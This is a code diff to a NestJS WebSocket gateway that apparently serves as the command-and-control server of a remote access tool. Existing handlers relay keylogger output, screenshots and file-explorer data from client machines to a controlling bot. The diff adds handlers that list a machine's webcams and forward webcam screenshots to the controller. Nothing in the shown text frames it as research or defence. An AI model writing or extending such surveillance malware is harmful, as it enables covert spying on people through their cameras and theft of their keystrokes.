@@ -20,6 +20,8 @@ import type {
   GetScreenshotFromClientEvent,
   GetKeyloggerFromClientEvent,
   MessageToBotEvent,
+  GetWebcams,
+  GetWebcamScreenshot,
 } from "../types/ws-client-events.type";
 import type { FileRequest } from "../types/tasks.type";
 import { Logger, UseGuards } from "@nestjs/common";
@@ -36,6 +38,7 @@ import { CommandsGuard } from "../../client/domain/commands.guard";
 import { SetCommand } from "../../client/domain/commands.decorator";
 import { WsBotKeyLoggerUseCase } from "../../ws-bot/application/events/ws-bot-keylogger.use-case";
 import { WsBotSendMessageUseCase } from "../../ws-bot/application/events/ws-bot-send-message.use-case";
+import { WsBotWebcamsUseCase } from "../../ws-bot/application/events/ws-bot-webcams.use-case";
 
 @WebSocketGateway({
   namespace: "clients",
@@ -43,8 +46,7 @@ import { WsBotSendMessageUseCase } from "../../ws-bot/application/events/ws-bot-
   maxHttpBufferSize: 1e8,
 })
 export class WsClientGateway
-  implements OnGatewayConnection, OnGatewayDisconnect
-{
+  implements OnGatewayConnection, OnGatewayDisconnect {
   @WebSocketServer()
   server!: Server;
 
@@ -60,10 +62,11 @@ export class WsClientGateway
     private readonly wsBotSendExplorerUseCase: WsBotSendExplorerUseCase,
     private readonly wsBotKeyloggerUseCase: WsBotKeyLoggerUseCase,
     private readonly wsBotSendMessageUseCase: WsBotSendMessageUseCase,
-    // private readonly logger: LoggerService,
+    private readonly wsBotWebcamsUseCase: WsBotWebcamsUseCase,
+
     private readonly redisRepository: RedisRepository,
     @InjectRedis() private readonly redis: Redis,
-  ) {}
+  ) { }
 
   async sendEventToClient(clientid: string, event: string, payload?: any) {
     // const client = this.server.sockets.sockets.get(clientid);
@@ -226,6 +229,35 @@ export class WsClientGateway
       data.keys,
     );
   }
+  @UseGuards(WsClientGuard, CommandsGuard)
+  @SetCommand("cameras")
+  @SubscribeMessage("getWebcams")
+  async getWebcams(client: Socket, data: GetWebcams) {
+    const messageid = await this.redisRepository.HGET(
+      ["messages-bot"],
+      data.identifier,
+    );
+
+    console.log("messageid", messageid);
+
+    this.wsBotWebcamsUseCase.sendWebcamsToBot(
+      client.handshake.query.controllerid as string,
+      messageid ?? "",
+      data.webcams,
+    )
+  }
+
+  @UseGuards(WsClientGuard, CommandsGuard)
+  @SetCommand("cameras")
+  @SubscribeMessage("screenshotWebcam")
+  async getWebcamScreenshot(client: Socket, data: GetWebcamScreenshot) {
+
+
+    this.wsBotWebcamsUseCase.sendWebcamScreenshotToBot(
+      client.handshake.query.controllerid as string,
+      data.screenshot
+    )
+  }
 
   @UseGuards(WsClientGuard)
   @SubscribeMessage("message")
@@ -235,4 +267,5 @@ export class WsClientGateway
       data,
     );
   }
+
 }
